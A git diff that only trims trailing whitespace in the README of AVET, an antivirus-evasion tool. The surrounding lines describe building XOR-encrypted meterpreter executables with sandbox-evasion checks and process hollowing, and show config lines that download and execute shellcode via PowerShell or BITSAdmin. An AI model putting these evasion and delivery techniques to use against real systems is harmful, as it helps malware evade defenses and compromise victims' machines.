@@ -94,7 +94,7 @@ alias avet='sudo docker run -it --net=host --env="DISPLAY" --volume="$HOME/.Xaut
 
 It lists all scripts that are currently present in the build folder. After selecting one, you will be able to step through the script line by line, having the opportunity to modify the contents on the fly.
 
-The latter is especially useful as you can define new LHOST and LPORT variables for msfvenom each time you run a build script via the fabric. 
+The latter is especially useful as you can define new LHOST and LPORT variables for msfvenom each time you run a build script via the fabric.
 You can define default LHOST and LPORT values in the `/build/global_connect_config.sh` file, which are used if you don't redefine.
 
 These modifications are temporary, which means that any changes you made will not persist in the build script on disk.
@@ -195,24 +195,24 @@ Executable will be created Shortly please wait.
 
 *** ============================================= ***
 
-         .==,_                                          
-        .===,_`\\                                        
-      .====,_ ` \\      .====,__                         
----     .==-,`~. \\           `:`.__,                    
- ---      `~~=-.  \\           /^^^     MEEP MEEP        
-   ---       `~~=. \\         /                          
-                `~. \\       /                           
-                  ~. \\____./                            
-                    `.=====)                            
-                 ___.--~~~--.__                         
-       ___\\.--~~~              ~~~---.._|/              
-       ~~~\\\"                             /              
+         .==,_
+        .===,_`\\
+      .====,_ ` \\      .====,__
+---     .==-,`~. \\           `:`.__,
+ ---      `~~=-.  \\           /^^^     MEEP MEEP
+   ---       `~~=. \\         /
+                `~. \\       /
+                  ~. \\____./
+                    `.=====)
+                 ___.--~~~--.__
+       ___\\.--~~~              ~~~---.._|/
+       ~~~\\\"                             /
 
- ________  ___      ___ _____  __________  
-|\   __  \|\  \    /  /|\  __\ |\___   __\ 
-\ \  \|\  \ \  \  /  / | \ \__ \|__|\  \_| 
- \ \   __  \ \  \/  / / \ \  _\    \ \  \  
-  \ \  \ \  \ \    / /   \ \ \___   \ \  \ 
+ ________  ___      ___ _____  __________
+|\   __  \|\  \    /  /|\  __\ |\___   __\
+\ \  \|\  \ \  \  /  / | \ \__ \|__|\  \_|
+ \ \   __  \ \  \/  / / \ \  _\    \ \  \
+  \ \  \ \  \ \    / /   \ \ \___   \ \  \
    \ \__\ \__\ \__/ /     \ \____\   \ \__\
     \|__|\|__|\|__|/       \|_____|   \|__|
 
@@ -241,7 +241,7 @@ Your executable should be in the output folder!
 
 ## AVET the normal way
 
-Of course it is possible to run all commands step by step from command line. However, in the "build" folder you will find preconfigured build scripts for relevant use cases. 
+Of course it is possible to run all commands step by step from command line. However, in the "build" folder you will find preconfigured build scripts for relevant use cases.
 The build scripts themselves are written so as they have to be called from within the avet directory:
 ```bash
 kali@kali:~/tools/avet$ ./build/build_fopen_mtrprtrxor_revhttps_win64.sh
@@ -259,13 +259,13 @@ First, generate the hollowing payload with AVET:
 - the meterpreter shellcode will be XOR encrypted with a 5-byte preset key
 - the shellcode will be compiled into the generated executable
 - fopen and gethostbyname sandbox evasion environmental checks will be made before executing the shellcode
-	
+
 Second, build the "dropper" executable that delivers the first step payload via hollowing:
 - statically compile the first step payload into the executable
 - the payload will be XOR encrypted with a different 5-byte preset key
 - again, fopen and gethostbyname sandbox evasion environmental checks will be made before hollowing
 - the hollowing target PID will be delivered via command line argument on execution time
-	
+
 So you get a two-layer environmental-checked and encrypted meterpreter payload, hollowed into a process of your choice.
 While the settings in the build script are mostly for demonstration purposes, there is a lot of flexibility to customize your generated executable by making simple modifications to the build script.
 
@@ -350,7 +350,7 @@ A few examples:
 set_command_source static_from_here 'calc.exe'
 set_command_exec exec_via_cmd
 
-# Download 64-bit shellcode via powershell, and execute. 
+# Download 64-bit shellcode via powershell, and execute.
 set_payload_source download_powershell
 set_payload_execution_method exec_shellcode64
 
@@ -666,7 +666,7 @@ add_evasion has_network_drive
 Grants you the ability to execute an additional cmd/powershell payload directly after the eventual sandbox evasion functions.
 The payload source is compatible with AVET's data retrieval methods.
 
-The following example downloads a powershell payload via BITSAdmin: 
+The following example downloads a powershell payload via BITSAdmin:
 ```
 set_command_source download_bitsadmin
 set_command_exec exec_via_powershell
@@ -695,7 +695,7 @@ AVET is compatible to metasploit's psexec module. For that, the generated execut
 *build_svc_20xshikata_bindtcp_win32.sh*:
 
 ```
-#!/bin/bash          
+#!/bin/bash
 # Designed for use with msf psexec module!
 
 # print AVET logo
@@ -866,7 +866,7 @@ More about adversarial examples, genetic optimizing and MalConv can be read here
 ## More
 ---
 
-For basics about antivirus evasion, AVET & more information have a look here (most for version 1.3): 
+For basics about antivirus evasion, AVET & more information have a look here (most for version 1.3):
 - [https://govolution.wordpress.com/2018/08/07/paper-avet-blackhat-usa-arsenal-2018/](https://govolution.wordpress.com/2018/08/07/paper-avet-blackhat-usa-arsenal-2018/)
 - [https://govolution.wordpress.com/2017/06/11/avet-video/](https://govolution.wordpress.com/2017/06/11/avet-video/)
 - [https://govolutionde.files.wordpress.com/2014/05/avevasion_pentestmag.pdf](https://govolutionde.files.wordpress.com/2014/05/avevasion_pentestmag.pdf)
